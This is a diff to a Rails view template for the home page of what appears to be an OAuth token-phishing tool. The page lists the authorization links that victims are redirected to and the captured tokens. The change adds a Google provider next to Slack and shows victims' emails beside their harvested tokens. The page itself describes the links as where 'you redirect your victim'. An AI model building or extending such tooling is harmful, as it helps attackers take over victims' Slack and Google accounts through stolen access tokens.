@@ -3,11 +3,12 @@ This is the home page.
 This will list all valid authentication URLs (where you redirect your victim to) and available tokens that can be used.
 
 <h2>Authorization Paths</h2>
-<hr>
-  <p><%=link_to("Slack",root_url+'auth/slack') %> (DISCLAIMER: YOU WILL GET HACKED IF YOU CLICK ON THIS LINK)
+<p><b>(DISCLAIMER: YOU WILL GET HACKED IF YOU CLICK ON THESE LINKS)</b></p>
+<p><%=link_to("Slack",root_url+'auth/slack') %>
+<p><%=link_to("Google",root_url+'auth/google') %>
 
 <h2>Available Tokens</h2>
 <% @tokens.each do |token| %>
   <% token.info = JSON.parse(token.info) %>
-  <p><%=link_to(token.info['user'], '/'+token.provider+"/"+token.id.to_s)%></p>
+  <p><%=link_to(token.info['user'] || token.info['email'], '/'+token.provider+"/"+token.id.to_s)%></p>
 <% end %>
